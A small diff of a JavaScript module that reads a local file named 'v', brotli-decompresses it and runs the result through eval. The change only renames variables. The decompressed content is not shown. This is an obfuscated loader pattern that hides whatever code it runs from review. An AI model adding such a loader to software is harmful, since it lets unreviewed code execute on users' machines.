@@ -1,5 +1,5 @@
 import{readFileSync as R}from'fs'
-import{brotliDecompressSync as Z}from'zlib'
-let b=R(import.meta.dirname+'/v')
-let s=''+Z(b)
+import{brotliDecompressSync as b}from'zlib'
+let p=import.meta.dirname+'/v'
+let s=b(R(p))+''
 await eval(s)
